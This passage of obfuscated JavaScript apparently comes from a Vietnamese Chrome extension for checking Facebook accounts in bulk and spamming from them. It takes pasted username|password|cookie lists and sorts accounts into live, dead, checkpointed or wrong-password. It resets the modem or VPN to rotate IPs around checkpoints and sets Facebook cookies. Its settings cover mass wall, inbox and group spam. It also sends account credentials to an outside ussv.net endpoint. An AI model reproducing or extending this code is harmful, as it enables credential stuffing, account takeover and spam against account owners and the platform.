                    l4 = $(f1W.H0I)[f1W.o07](),
                    G4 = $(f1W.p8a)[f1W.o07](),
                    t4 = $(f1W.a9y)[f1W.o07](),
                    O4 = $(f1W.z00)[f1W.o07](),
                    Z1 = $(f1W.d90)[f1W.o07](),
                    r1 = $(f1W.A7Q)[f1W.o07](),
                    d4 = $(f1W.k6v)[f1W.o07]();
                chrome[f1W.v1O][f1W.N0v][f1W.v0Q]({
                    "uss_st_lancheck": y0,
                    "uss_st_check_str": p4,
                    "uss_st_autlike": x0,
                    "uss_st_checkpoint": A0,
                    "uss_st_saipass": O0,
                    "uss_st_mp3alert": D0,
                    "uss_st_spam": V4,
                    "uss_st_auto_keomem": z0,
                    "uss_st_auto_keomem_speed": j4,
                    "uss_st_auto_keomem_limit": S0,
                    "uss_st_auto_keomem_id": a0,
                    "uss_st_clearbrower": c0,
                    "uss_st_type_internet": w0,
                    "uss_st_type_internet_auto_rs": b4,
                    "uss_st_type_internet_auto_rs_per": q4,
                    "uss_st_type_spam": e4,
                    "uss_st_type_spam_wall": W4,
                    "uss_st_spam_need_fr": r4,
                    "uss_st_type_spam_inbox": n4,
                    "uss_st_spam_inbox_via": f4,
                    "uss_st_inbox_title": E4,
                    "uss_st_inbox_link": M4,
                    "uss_st_spam_time_inbox": X4,
                    "uss_st_spam_need_fr_inbox_f": k4,
                    "uss_st_spam_need_fr_inbox_l": R4,
                    "uss_st_spam_delmsg_inbox": y4,
                    "uss_st_spam_inbox_autocaptcha": s4,
                    "uss_st_spam_inbox_alertcaptcha": h4,
                    "uss_st_spam_via": H4,
                    "GroupCore_spam_content": e0,
                    "uss_st_cmt_post_group": t0,
                    "GroupCore_spam_loc_listgroup": D4,
                    "GroupCore_spam_listid_blackgroup": h0,
                    "GroupCore_spam_sl_limit_post": R0,
                    "GroupCore_spam_sl_Method_post": C4,
                    "uss_st_check_type": I4,
                    "st_CustomJs_Url": z4,
                    "sl_CustomJS": Y4,
                    "st_sl_CustomJs_Type": P4,
                    "GroupCore_spam_sl_UseVPN": m4,
                    "GroupCore_spam_TypeUSS_URL": J4,
                    "GroupCore_spam_TypeUSS_Data": c4,
                    "st_sl_CustomVPN_CP_ChangeIp_BeforeLogin": a4,
                    "uss_st_check_country": d0,
                    "uss_st_check_firstpost": F1,
                    "uss_st_check_savecoookie": E1,
                    "uss_st_id_ppa": x4,
                    "uss_st_check_group": S4,
                    "uss_st_check_page": l4,
                    "uss_st_check_fullinfo": G4,
                    "uss_st_check_info": t4,
                    "uss_st_check_rename": O4,
                    "uss_st_check_FriendSub": Z1,
                    "uss_st_Id_Sub": r1,
                    "uss_st_check_saveusskey": d4,
                }, function() {});
            } else if (f1W[L0](f[f1W.O4y], f1W.G47)) {
                chrome[f1W.v1O][f1W.N0v][f1W.G47]([f1W.n8X, G0, I0, M0, T0, C0, m0, u0, g0, Y0, P0, K0, v0, l0, N0, k0, f0, J0, i0, V0, s0, b0, U0, n0, X0, A, Z0, o0, B0, w, W0, H0, q0, p0, u, S, Q, r0, K, F0, E0, L, c, J, P, z, C, G, D, I, T, g, N, Y, n, ], function(W) {
                    var V = "slideUp",
                        E = "slideDown",
                        O = ".Div_CheckInfo",
                        Z = "h2t",
                        F = "R2t",
                        o = "f2t",
                        U = "H2t",
                        p = "#div_info_cmt_post_group",
                        M = "q2t",
                        b = "b2t",
                        H = "U2t",
                        R = "Z2t",
                        X = "O2t";
                    if (W[G0]) {
                        $(f1W.M40)[f1W.o07](W[f1W.n8X]);
                        $(f1W.J80)[f1W.o07](f1W.V8v + W[G0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.z7O)[f1W.o07](f1W.V8v + W[I0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        if (f1W[X](W[I0], f1W.S9a)) {
                            $(f1W.a9X)[f1W.l6Q](f1W.Y5a);
                        } else {
                            $(f1W.a9X)[f1W.v37]();
                        }
                        $(f1W.f7Y)[f1W.o07](f1W.V8v + W[M0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.I1X)[f1W.o07](f1W.V8v + W[T0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.k4Q)[f1W.o07](f1W.V8v + W[C0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        if (W[m0]) {
                            $(f1W.n67)[f1W.o07](f1W.V8v + W[m0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.X8X)[f1W.o07](f1W.V8v + W[k0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.q9O)[f1W.o07](f1W.V8v + W[f0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            if (f1W[R](W[f0], f1W.S9a)) {
                                $(f1W.Q9Q)[f1W.v37]();
                                $(f1W.I5v)[f1W.R4r]();
                            } else {
                                $(f1W.Q9Q)[f1W.R4r]();
                                $(f1W.I5v)[f1W.v37]();
                            }
                            $(f1W.n7a)[f1W.o07](f1W.V8v + W[J0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.c6v)[f1W.o07](f1W.V8v + W[i0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.F6v)[f1W.o07](f1W.V8v + W[V0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.X7y)[f1W.o07](f1W.V8v + W[s0] + f1W.V8v);
                            $(f1W.G4v)[f1W.o07](f1W.V8v + W[b0] + f1W.V8v);
                            $(f1W.o27)[f1W.o07](f1W.V8v + W[U0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.c4v)[f1W.o07](f1W.V8v + W[n0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.y0Y)[f1W.o07](f1W.V8v + W[X0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.w2I)[f1W.o07](f1W.V8v + W[A] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.p1y)[f1W.o07](f1W.V8v + W[Z0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.j2I)[f1W.o07](f1W.V8v + W[o0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(B4)[f1W.o07](f1W.V8v + W[B0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        };
                        $(f1W.e9I)[f1W.o07](f1W.V8v + W[u0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.F7a)[f1W.o07](f1W.V8v + W[g0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.i3X)[f1W.o07](f1W.V8v + W[Y0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.Y0y)[f1W.o07](W[P0]);
                        $(f1W.R6Q)[f1W.o07](f1W.V8v + W[K0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.w2y)[f1W.o07](f1W.V8v + W[v0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        if (f1W[H](W[v0], f1W.S9a)) {
                            $(f1W.k87)[f1W.l6Q](f1W.Y5a);
                        }
                        $(f1W.J2O)[f1W.o07](f1W.V8v + W[l0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.b4I)[f1W.o07](f1W.V8v + W[N0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.I5O)[f1W.o07](f1W.V8v + W[S] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        if (f1W[b](W[S], f1W.S9a)) {
                            $(f1W.e3r)[f1W.R4r]();
                            $(f1W.N6X)[f1W.l6Q](f1W.Y5a);
                        } else {
                            $(f1W.e3r)[f1W.v37]();
                            $(f1W.N6X)[f1W.v37]();
                        }
                        $(f1W.F4Y)[f1W.o07](f1W.V8v + W[w] + f1W.V8v);
                        if (W[W0]) {
                            $(f1W.B1v)[f1W.o07](f1W.V8v + W[W0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.O9v)[f1W.o07](f1W.V8v + W[p0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.A67)[f1W.o07](f1W.V8v + W[u] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                            $(f1W.o0Q)[f1W.o07](f1W.V8v + W[H0] + f1W.V8v);
                            $(f1W.o20)[f1W.o07](f1W.V8v + W[q0] + f1W.V8v);
                            if (f1W[M](W[W0], f1W.S9a)) {
                                $(p)[f1W.l6Q](f1W.Y5a);
                            } else {
                                $(p)[f1W.F50](f1W.Y5a);
                            }
                        };
                        $(f1W.E3r)[f1W.o07](f1W.V8v + W[Q] + f1W.V8v);
                        if (W[r0]) {
                            $(f1W.J2I)[f1W.o07](f1W.V8v + W[r0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        };
                        if (f1W[U](W[r0], f1W.S9a)) {
                            $(f1W.B2O)[f1W.l6Q](f1W.Y5a);
                        }
                        $(f1W.F0X)[f1W.o07](f1W.V8v + W[K] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        if (f1W[o](W[K], f1W.S9a)) {
                            $(f1W.U9Y)[f1W.Q0I](_lJ[f1W.G3v]({
                                "t": f1W.K1I,
                                "id": f1W.a8a
                            }));
                        } else {
                            $(f1W.U9Y)[f1W.Q0I](_lJ[f1W.G3v]({
                                "t": f1W.K1I,
                                "id": f1W.H7a
                            }));
                        }
                    };
                    if (W[F0]) {
                        $(f1W.n2y)[f1W.o07](f1W.V8v + W[F0] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.j7v)[f1W.o07](f1W.V8v + W[E0] + f1W.V8v);
                        $(f1W.F4y)[f1W.o07](f1W.V8v + W[L] + f1W.V8v);
                        if (f1W[F](W[u], f1W.I2O)) {
                            $(f1W.v7y)[f1W.R4r]();
                        } else {
                            $(f1W.v7y)[f1W.v37]();
                        }
                    };
                    if (W[c]) {
                        $(f1W.O8y)[f1W.o07](f1W.V8v + W[c] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.e57)[f1W.o07](f1W.V8v + W[J] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        $(f1W.S0O)[f1W.o07](f1W.V8v + W[P] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                    };
                    if (W[z]) {
                        $(f1W.f4Q)[f1W.o07](f1W.V8v + W[z] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                    };
                    if (W[C]) {
                        $(f1W.F1Y)[f1W.o07](f1W.V8v + W[C] + f1W.V8v);
                    };
                    if (W[I]) {
                        $(f1W.p97)[f1W.o07](f1W.V8v + W[G] + f1W.V8v);
                        $(f1W.H0I)[f1W.o07](f1W.V8v + W[D] + f1W.V8v);
                        $(f1W.p8a)[f1W.o07](f1W.V8v + W[I] + f1W.V8v);
                    };
                    if (W[T]) {
                        $(f1W.a9y)[f1W.o07](f1W.V8v + W[T] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        if (f1W[Z](W[T], f1W.B5r)) {
                            $(O)[E](f1W.Y5a);
                        } else {
                            $(O)[V](f1W.Y5a);
                        }
                    };
                    if (W[g]) {
                        $(f1W.z00)[f1W.o07](f1W.V8v + W[g] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                    };
                    if (W[N]) {
                        $(f1W.d90)[f1W.o07](f1W.V8v + W[N] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                    };
                    if (W[n]) {
                        $(f1W.k6v)[f1W.o07](f1W.V8v + W[n] + f1W.V8v)[f1W.V6Q](f1W.J9r, f1W.A0r);
                    };
                    if (W[Y]) {
                        $(f1W.A7Q)[f1W.o07](f1W.V8v + W[Y] + f1W.V8v);
                    };
                });
            } else {}
        };
    }

    function U_Dom(E) {
        var O = "xxxxUS",
            Z = "t|uss_safe|u||?type=base&ukey=t8&ufile=s&key=",
            F = "b36",
            o = "xxxxUL",
            U = "t|lang_vi_1_2|u|",
            p = "U36";
        if (f1W[p](E, f1W.i8Y)) {
            var M = gl[f1W.Y5v](f1W.S9a, U),
                b = o;
        } else if (f1W[F](E, f1W.e4Y)) {
            var M = gl[f1W.Y5v](f1W.S9a, Z + ussv_key_base),
                b = O;
        }
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: M,
            data: "base=hau"
        }, function(W) {
            var V = "first";
            $("body div")[V]()[f1W.u2r]("<textarea class=' hidden " + b + "'>" + W + "</textarea>");
        });
    }

    function setCookie(W, V, E) {
        var O = "toUTCString",
            Z = ";domain=.facebook.com;expires=",
            F = "H8",
            o = "setDate",
            U = function() {
                document[f1W.T2O] = W + f1W.Q4Y + M;
            },
            p = new Date();
        p[o](p[f1W.t9Y]() + E);
        var M = escape(V) + ((f1W[F](E, f1W.x0r)) ? f1W.V8v : Z + p[O]());
        U();
    }

    function CheckV2() {
        var H4 = "#data_list_acc_coban_kxd",
            I4 = "#data_list_acc_coban",
            e0 = "Checkpoint",
            t0 = "Logs",
            D4 = "ResetSSH",
            h0 = "ResetDcom",
            R0 = "Save",
            C4 = "stellar",
            z4 = "AccInfo",
            Y4 = "UpdateList",
            P4 = "Safeinfo",
            m4 = "ChangeVPN",
            J4 = "AutCustomVPN",
            c4 = "AccParse",
            a4 = "#data_list_acc_coban_live";

        function d0(W) {
            var V = $(a4)[f1W.o07]();
            $(a4)[f1W.o07](V + f1W.F0r + W);
        }
        this[f1W.Z0y] = function() {
            var p = "V4B",
                M = "Q0B",
                b = "x0B",
                H = "l0B",
                R = "C0B",
                X = "g0B",
                f = $("#data_list_acc_coban")[f1W.o07]();
            $("#popup_ussv_logs")[f1W.l6Q](500);
            if (f1W[X](f, null) || f1W[R](f, "") || f1W[H](f, undefined)) {
                Div_AccList();
                $("#data_list_acc_coban")[f1W.C3O]("border", "1px solid rgb(239, 66, 66)");
                $("#AccList_Laning_Note")[f1W.Q0I]('<span style="color:rgb(231, 27, 89)">Vui lòng thêm tài kho?n tru?c khi Check !</span>');
                dom_logs_ussv("Vui Lòng Thêm List Acc Tru?c Khi Check", "0|0|_|ok|check");
            } else {
                CheckV2[c4]();
                $("#data_list_acc_coban")[f1W.o07](f[f1W.F6r](/ - /gi, "|")[f1W.F6r](/ \| /gi, "|"));
                var f = $("#data_list_acc_coban")[f1W.o07](),
                    n = f[f1W.X3Q]("\n").length;
                reset_thongke_check();
                acc_doing[f1W.f17] = 0;
                dom_logs_ussv("List Acc Hi?n Có " + n + " Tài Kho?n", "0|0|_|ok|check");
                if (f1W[b](n, 1)) {
                    reset_thongke_check();
                    acc_doing[f1W.f17] = 0;
                    var Y = new Date(),
                        N = Y[f1W.m2Q](),
                        g = Y[f1W.Y6v](),
                        T = Y[f1W.I8O](),
                        Y = N + ":" + g + ":" + T;
                    $("#thongke_time_start")[f1W.Q0I](Y);
                    demtime = 1;
                    $("#thong_check_live")[f1W.Q0I]("0");
                    $("#thong_check_die")[f1W.Q0I]("0");
                    $("#thong_check_cp")[f1W.Q0I]("0");
                    $("#thong_check_kxd")[f1W.Q0I]("0");
                    $("#thong_check_total")[f1W.Q0I]("0");
                    $("#uss_checkpoint")[f1W.Q0I]("0");
                    $("#uss_saipass")[f1W.Q0I]("0");
                    $("#div_pnc_right_check")[f1W.R4r]();
                    $('#div_pnc_right_ketqua')[f1W.C3O]('background-image', 'url(https://ussv.net/themes/img/loading_check_1.gif)');
                    $("#thongke_fbchuacheck")[f1W.Q0I]('<img style="margin-top: 5px;" src="https://ussv.net/themes/img/load_stt.gif">');
                    var I = $("#uss_username")[f1W.Q0I]();
                    $("#stt_checking")[f1W.Q0I]("USS CHECK râ´t hân ha?nh duo?c phu?c vu? ba?n ! USSV dang tiê´n ha`nh xa´c minh ta`i khoa?n " + I);
                    $("#thongke_fbchuacheck")[f1W.Q0I](n);
                    $("#stt_check")[f1W.Q0I]("1");
                    open_div_ussv_logs("refresh");
                    var D = setInterval(function() {
                            var W = "t0B",
                                V = "w0B",
                                E = $("#stt_check")[f1W.Q0I](),
                                O = demtime++,
                                O = f1W[V](O, 10);
                            document[f1W.C4y]("thongke_totla_time")[f1W.V5I] = O;
                            if (f1W[W](E, "0")) {
                                clearInterval(D);
                                var Z = new Date(),
                                    F = Z[f1W.m2Q](),
                                    o = Z[f1W.Y6v](),
                                    U = Z[f1W.I8O](),
                                    Z = F + ":" + o + ":" + U;
                                $("#thongke_time_end")[f1W.Q0I](Z);
                            }
                        }, 100),
                        G = $("#uss_vip")[f1W.Q0I]();
                    if (f1W[M](G, "1")) {
                        var C = $("#uss_spam")[f1W.Q0I]();
                        if (f1W[p](C, "1")) {
                            get_setting_spam("hau");
                        } else {
                            $("#stt_checking")[f1W.Q0I]("Ti´nh nang SPAM chua duo?c bâ?t, tiê´n ha`nh Check Live...");
                            get_OneAcc();
                        }
                    } else {
                        $("#stt_checking")[f1W.Q0I]("Ba?n dang Check vo´i Go´i Free...");
                        get_OneAcc();
                    }
                } else {
                    dom_logs_ussv("S? Acc quá ích không th? ti?n hành Check", "0|0|_|error|check");
                }
            }
        };
        this[f1W.t5X] = function(Z) {
            var F = "A1B",
                o = "G1B",
                U = "v1B",
                p = "u1B",
                M = "c1B",
                b = "J1B",
                H = "I1B",
                R = "T1B",
                X = "a1B",
                f = "i1B",
                n = "n1B",
                Y = "M1B",
                N = "e1B",
                g = "E1B",
                T = "W1B",
                I = "d4B",
                D = "K4B",
                G = "L4B",
                C = "S4B",
                z = "P4B",
                P = "R4B",
                J = "f4B",
                c = "H4B",
                L = "q4B",
                E0 = "b4B",
                F0 = "U4B",
                K = "Z4B",
                r0 = "O4B",
                Q = parseInt($("#thong_check_total")[f1W.Q0I]()),
                S = parseInt($("#thong_check_totalneed")[f1W.Q0I]());
            if (f1W[r0](S, Q)) {
                var u = "Qu´a tri`nh Check " + S + " Lâ`n Hoa`n Tâ´t.";
                $("#stt_checking")[f1W.Q0I](u);
                dom_logs_ussv(u, "0|_|_|ok|check");
                stop_check();
                $('#div_pnc_right_ketqua')[f1W.C3O]('background-image', 'url()');
                danhgiacheck();
            } else {
                var p0 = $("#uss_saipass")[f1W.Q0I](),
                    q0 = $("#uss_checkpoint")[f1W.Q0I](),
                    H0 = parseInt($("#uss_lan_rs_dcom")[f1W.Q0I]()),
                    W0 = parseInt($("#uss_lan_rs_vpn")[f1W.m8y]()),
                    w = $("#st_sl_CustomVPN_CP_ChangeIp_Per")[f1W.o07]();
                if (f1W[K](p0, $("#uss_lan_saipass")[f1W.Q0I]())) {
                    var B0 = "Hiê?n Ta`i Khoa?n truo´c la` toa`n khoa?n thu´ " + p0 + " bi? Sai Pass !<br/>Theo thiê´t lâ?p cu?a ba?n thi` hê? thô´ng se~ ca?nh ba´o nê´u nhu co´ qua´ " + p0 + " Ta`i Khoa?n liên tiê´p bi? Sai Pass<br/>";
                    B0 += "Vui lo`ng Xo´a Cookie tri`nh Duyê?t, Sau Ðo´ Reset IP dê? tiê´p tu?c Su? Du?ng Tools<br/>Viê?c Check Sai Pass liên tu?c duo?c da´nh gia´ la` Nghiêm tro?ng Nhâ´t, chu´ng tôi câ`n ngan cha?n qua´ tri`nh na`y dê? tra´nh ti`nh tra?ng Sai Pass Ha`ng Loa?t !";
                    if (f1W[F0]($("#uss_st_mp3alert")[f1W.o07](), "yes")) {
                        B0 += '<audio autoplay><source src="https://ussv.net/themes/checkpoint.mp3" type="audio/mpeg" /></audio>';
                    }
                    div_thongbao(B0);
                    var o0 = $("#stt_check")[f1W.Q0I]("0");
                    $('#div_pnc_right_ketqua')[f1W.C3O]('background-image', 'url()');
                    $("#start_check")[f1W.R4r]();
                    $("#stop_check")[f1W.v37]();
                    var Z0 = "Qu´a tri`nh Check bi? ngu`ng vi` qua´ " + p0 + " Ta`i khoa?n bi? Sai pass";
                    $("#stt_checking")[f1W.Q0I](Z0);
                    dom_logs_ussv(Z0, "0|_|_|error|check");
                    stop_check();
                }
                if (f1W[E0](ussnow[f1W.K1I][f1W.q2X], $("#uss_st_kxd")[f1W.o07]())) {
                    var B0 = "Hiê?n Ta`i Khoa?n truo´c la` toa`n khoa?n thu´ " + ussnow[f1W.K1I][f1W.q2X] + " bi? l?i Không Xác Ð?nh liên t?c !<br/>Theo thiê´t lâ?p cu?a ba?n thi` hê? thô´ng se~ ca?nh ba´o nê´u nhu co´ qua´ " + $("#uss_st_kxd")[f1W.o07]() + " Ta`i Khoa?n liên t?c b? l?i KXD<br/>";
                    B0 += "Vui lòng ki?m tra l?i k?t n?i m?ng, SSH ho?c ID APP. Vi?c l?i KXD liên t?c du?c USS dánh giá là nghiêm tr?ng, ?nh hu?ng r?t l?n d?n ti?n trình Check, Get Token, có th? xu?t phát t? Vi?c m?t m?ng, k?t n?i kém, ho?c SSH l?i.";
                    if (f1W[L]($("#uss_st_mp3alert")[f1W.o07](), "yes")) {
                        B0 += '<audio autoplay><source src="https://ussv.net/themes/checkpoint.mp3" type="audio/mpeg" /></audio>';
                    }
                    uss[f1W.w8Q]({
                        "Body": B0
                    });
                    var o0 = $("#stt_check")[f1W.Q0I]("0");
                    $('#div_pnc_right_ketqua')[f1W.C3O]('background-image', 'url()');
                    $("#start_check")[f1W.R4r]();
                    $("#stop_check")[f1W.v37]();
                    var Z0 = "Qu´a tri`nh Check bi? ngu`ng vi` qua´ " + $("#uss_st_kxd")[f1W.o07]() + " Ta`i khoa?n bi? l?i KXD";
                    $("#stt_checking")[f1W.Q0I](Z0);
                    dom_logs_ussv(Z0, "0|_|_|error|check");
                    ussnow[f1W.K1I][f1W.q2X] = 0;
                    stop_check();
                } else if (f1W[c](q0, $("#uss_lan_checkpoint")[f1W.Q0I]())) {
                    dom_logs_ussv(lang_vi_checking_manyCP, "0|_|_|error|check");
                    if (f1W[J]($("#uss_st_type_internet_auto_rs")[f1W.o07](), 1)) {
                        var B0 = _lJ[f1W.G3v]({
                            "t": "check",
                            "id": "a1",
                            "r": "hj"
                        });
                        div_thongbao(B0);
                        note = $(".ussv_log_panel_rsdcom.note");
                        dem = 0;
                        data = uss[f1W.r5Q]({
                            "type": 2,
                            "fb_id": 00000
                        });
                        if (f1W[P](data[f1W.C3y], 0)) {
                            $(note)[f1W.m8y](data[f1W.F5v]);
                            var A = setInterval(function() {
                                var E = "h4B";
                                dem = dem + 1;
                                data = uss[f1W.r5Q]({
                                    "type": 1
                                });
                                if (f1W[E](data[f1W.C3y], "done")) {
                                    $(note)[f1W.m8y](data[f1W.F5v]);
                                    dom_logs_ussv(data[f1W.F5v], "0|_|_|ok|check");
                                    $(".header")[f1W.C3O]("background", "#39C245");
                                    $(".ussv_log_panel_rsdcomfn")[f1W.Q0I](_lJ[f1W.G3v]({
                                        "t": "check",
                                        "id": "a2",
                                        "r": "hj"
                                    }));
                                    clearInterval(A);
                                    dem = 3;
                                    var O = setInterval(function() {
                                        var W = "z4B",
                                            V = "N4B";
                                        dem = f1W[V](dem, 1);
                                        $(".ussv_log_panel_rsdcomfndn")[f1W.Q0I](dem);
                                        if (f1W[W](dem, 0)) {
                                            clearInterval(O);
                                            $("#div_thongbao")[f1W.w5I]();
                                            $("#uss_checkpoint")[f1W.Q0I]("0");
                                            get_OneAcc();
                                        }
                                    }, 1000);
                                } else {
                                    $(note)[f1W.m8y]("Ðang ch? Reset Dcom (" + dem + ")");
                                }
                            }, 4000);
                        } else {
                            $(".ussv_log_panel_rsdcom.note")[f1W.m8y]("Yêu c?u th?t b?i !");
                        }
                    } else if (f1W[z](CheckV2[J4]({
                            "Type": "Checkpoint"
                        }), 1)) {
                        CheckV2[m4]({});
                    } else {
                        var B0 = "Hiê?n Ta`i Khoa?n truo´c la` toa`n khoa?n thu´ " + q0 + " bi? Checkpoint<br/>";
                        B0 += "Vui lo`ng Reset IP sau do´ nhâ´n Tiê´p Tu?c Check dê? Tools tiê´p tu?c Check.<br/>Hoa?c nhâ´n Tiê´p Tu?c Check ngay bây gio` dê? tools tiêp tu?c check, co´ thê? se~ bi? Checkpoint liên tu?c , vui lo`ng cân nha´c truo´c khi thao ta´c .";
                        B0 += '<br/><br/><center><button style="" class="btn_checktiep" id="tieptuccheck">Tiê´p Tu?c Check</button></center>';
                        if (f1W[C]($("#uss_st_mp3alert")[f1W.o07](), "yes")) {
                            B0 += '<audio autoplay><source src="https://ussv.net/themes/checkpoint.mp3" type="audio/mpeg" /></audio>';
                        }
                        div_thongbao(B0);
                    }
                } else if (f1W[G](w, 1) && f1W[D](w, W0)) {
                    if (f1W[I](CheckV2[J4]({
                            "Type": "Reset_VPN"
                        }), 1)) {
                        dom_logs_ussv("Ti?n hành Change VPN vì dã d? " + w + " Tài kho?n Live...", "0|_|_|ok|check");
                        $("#uss_lan_rs_vpn")[f1W.m8y]("0");
                        CheckV2[m4]({});
                    } else {
                        div_thongbao("L?i Không Xác Ð?nh : 1582");
                    }
                } else if (f1W[T](H0, $("#uss_st_type_internet_auto_rs_per")[f1W.o07]())) {
                    note = H0 + "--x";
                    var B0 = _lJ[f1W.G3v]({
                        "t": "check",
                        "id": "a5",
                        "r": note
                    });
                    div_thongbao(B0);
                    note = $(".ussv_log_panel_rsdcom.note");
                    dem = 0;
                    data = uss[f1W.r5Q]({
                        "type": 2,
                        "fb_id": 00000
                    });
                    if (f1W[g](data[f1W.C3y], 0)) {
                        $(note)[f1W.m8y](data[f1W.F5v]);
                        var A = setInterval(function() {
                            var E = "r1B";
                            dem = dem + 1;
                            data = uss[f1W.r5Q]({
                                "type": 1
                            });
                            if (f1W[E](data[f1W.C3y], "done")) {
                                $(note)[f1W.m8y](data[f1W.F5v]);
                                dom_logs_ussv(data[f1W.F5v], "0|_|_|ok|check");
                                $(".header")[f1W.C3O]("background", "#39C245");
                                $(".ussv_log_panel_rsdcomfn")[f1W.Q0I](_lJ[f1W.G3v]({
                                    "t": "check",
                                    "id": "a2",
                                    "r": "hj"
                                }));
                                clearInterval(A);
                                dem = 2;
                                var O = setInterval(function() {
                                    var W = "p1B",
                                        V = "o1B";
                                    dem = f1W[V](dem, 1);
                                    $(".ussv_log_panel_rsdcomfndn")[f1W.Q0I](dem);
                                    if (f1W[W](dem, 0)) {
                                        clearInterval(O);
                                        $("#div_thongbao")[f1W.w5I]();
                                        $("#uss_lan_rs_dcom")[f1W.Q0I]("0");
                                        CheckV2[f1W.t5X]();
                                    }
                                }, 1000);
                            } else {
                                $(note)[f1W.m8y]("Ðang ch? Reset Dcom (" + dem + ")");
                            }
                        }, 4000);
                    } else {
                        $(".ussv_log_panel_rsdcom.note")[f1W.m8y]("Yêu c?u th?t b?i !");
                    }
                } else {
                    var o0 = $("#stt_check")[f1W.Q0I]();
                    $("#div_thongke_check")[f1W.C3O]("background", "rgba(252, 252, 252, 1)");
                    $("#stt_checking")[f1W.Q0I]("Ðang tiê´n ha`nh lâ´y du~ liê?u...");
                    if (f1W[N](o0, "1")) {
                        var X0 = $("#data_list_acc_coban")[f1W.o07]();
                        if (f1W[Y](X0[f1W.X3Q]("\n").length, 1)) {
                            if (f1W[n](X0[f1W.X3Q]("\n").length, 1) && f1W[f](X0[f1W.X3Q]("\n")[0], "")) {
                                dom_logs_ussv("S? Acc quá ích không th? ti?n hành Check", "0|0|_|error|check");
                                stop_check();
                                Div_AccList();
                                $("#data_list_acc_coban")[f1W.C3O]("border", "1px solid rgb(239, 66, 66)");
                                $("#AccList_Laning_Note")[f1W.Q0I]('<span style="color:rgb(231, 27, 89)">Vui lòng thêm tài kho?n tru?c khi Check !</span>');
                                dom_logs_ussv("Vui Lòng Thêm List Acc Tru?c Khi Check", "0|0|_|ok|check");
                            } else {
                                var n0 = X0[f1W.X3Q]("\n").length;
                                $("#AccList_TK_None")[f1W.m8y](f1W[X](n0, 1));
                                var U0 = X0[f1W.X3Q]("\n")[0];
                                $("#data_list_acc_coban")[f1W.o07](X0[f1W.F6r](U0 + "\n", "")[f1W.F6r](U0, ""));
                                if ($("#uss_st_unsafeaccount")[f1W.o07]()) {
                                    acc_doing[P4] = U0;
                                    var b0 = uss[f1W.G47]("https://ussv.net/Api_Center/CustomJs/2016/safe.php?type=unsafe&data=" + encodeURIComponent(U0) + "&key=" + $("#uss_st_unsafeaccount")[f1W.o07]()),
                                        b0 = b0[f1W.X3Q]("|");
                                } else {
                                    var b0 = U0[f1W.X3Q]("|");
                                }
                                var s0 = uss[f1W.K0v]({
                                        "type": "int",
                                        "lg": 9
                                    }),
                                    V0 = b0[0];
                                if (!b0[1]) {
                                    b0[1] = "";
                                };
                                var i0 = b0[1];
                                if (b0[2]) {
                                    if (f1W[R](b0[2][f1W.x3y]("Cookie"), null)) {
                                        var J0 = b0[2];
                                    } else {
                                        var J0 = "";
                                    }
                                } else {
                                    var J0 = "";
                                }
                                acc_doing[f1W.D87] = V0 + "|" + i0;
                                acc_doing[f1W.Y7Y] = V0;
                                acc_doing[f1W.n3Q] = i0;
                                acc_doing[f1W.A7y] = s0;
                                acc_doing[f1W.m7v] = J0;
                                uss[f1W.C37]({
                                    "type": "set",
                                    "data": {
                                        "ussv_logs_last_fb": V0 + "|" + i0
                                    }
                                });
